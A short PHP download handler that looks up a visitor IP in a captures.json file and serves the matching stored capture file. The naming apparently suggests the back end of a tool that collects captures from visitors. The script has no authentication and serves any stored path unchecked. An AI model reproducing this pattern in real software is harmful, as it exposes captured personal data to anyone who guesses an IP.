<?php
$ip = $_GET['user'] ?? '';
$index = $_GET['download'] ?? '';

if (empty($ip) || empty($index)) {
    die('Invalid request');
}

$data_dir = __DIR__ . '/data/';
$captures_file = $data_dir . 'captures.json';

if (!file_exists($captures_file)) {
    die('No data found');
}

$all_data = json_decode(file_get_contents($captures_file), true) ?: [];
$user_data = null;

foreach ($all_data as $u) {
    if ($u['ip'] == $ip) {
        $user_data = $u;
        break;
    }
}

if (!$user_data || !isset($user_data['captures'][$index])) {
    die('File not found');
}

$capture = $user_data['captures'][$index];
$file = $capture['file'] ?? '';

if (empty($file) || !file_exists($file)) {
    die('File does not exist');
}

header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
readfile($file);
exit;
?>
